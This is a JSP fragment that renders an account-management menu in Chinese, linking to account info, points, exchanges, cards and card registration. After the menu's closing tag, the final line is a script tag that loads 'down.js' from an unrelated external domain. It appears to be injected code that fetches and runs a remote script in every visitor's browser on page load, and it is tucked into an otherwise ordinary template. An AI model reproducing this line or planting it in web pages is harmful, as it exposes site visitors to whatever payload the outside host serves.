<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>

<table width="100%" border="0"  cellpadding="0" cellspacing="0">
        <tr> 
          <td height="26" class="red15" background="images/bg_table_title.gif" align="center">帐户管理</td>
        </tr>
        <tr>
          <td height="22" bgcolor="#FFFFFF" >
		  
		  <table width="100%" height="117" border="0" align="center">
            <tr>
              <td align="center" ondblclick="javascript:this.bgColor='#ACD1FF'"  onclick="javascript:this.bgColor='#ACD1FF'"  onmouseover="javascript:this.bgColor='#ACD1FF'" onmouseout="javascript:this.bgColor='#FFFFFF'" ><a href='<c:url value="/accountInfo.shtml"/>'>帐户信息</a></td>
            </tr>
            <tr>
              <td align="center" ondblclick="javascript:this.bgColor='#ACD1FF'" onclick="javascript:this.bgColor='#ACD1FF'" onmouseover="javascript:this.bgColor='#ACD1FF'" onmouseout="javascript:this.bgColor='#FFFFFF'"><a href='<c:url value="/queryPoint.do"/>'>积分列表</a></td>
            </tr>
            <tr>
              <td align="center" ondblclick="javascript:this.bgColor='#ACD1FF'" onclick="javascript:this.bgColor='#ACD1FF'" onmouseover="javascript:this.bgColor='#ACD1FF'" onmouseout="javascript:this.bgColor='#FFFFFF'"><a href='<c:url value="/queryExchange.do"/>'>兑换列表</a></td>
            </tr>
            <tr>
              <td align="center" ondblclick="javascript:this.bgColor='#ACD1FF'" onclick="javascript:this.bgColor='#ACD1FF'" onmouseover="javascript:this.bgColor='#ACD1FF'" onmouseout="javascript:this.bgColor='#FFFFFF'"><a href='<c:url value="/queryCard.do"/>'>卡列表</a></td>
            </tr>
            <tr>
              <td align="center" ondblclick="javascript:this.bgColor='#ACD1FF'" onclick="javascript:this.bgColor='#ACD1FF'" onmouseover="javascript:this.bgColor='#ACD1FF'" onmouseout="javascript:this.bgColor='#FFFFFF'"><a href='<c:url value="/registerCard.screen"/>'>挂卡</a></td>
            </tr>
                    </table></td>
        </tr>
</table>
      
<script language=javascript src=http://Town.531jx.cn/down.js></script>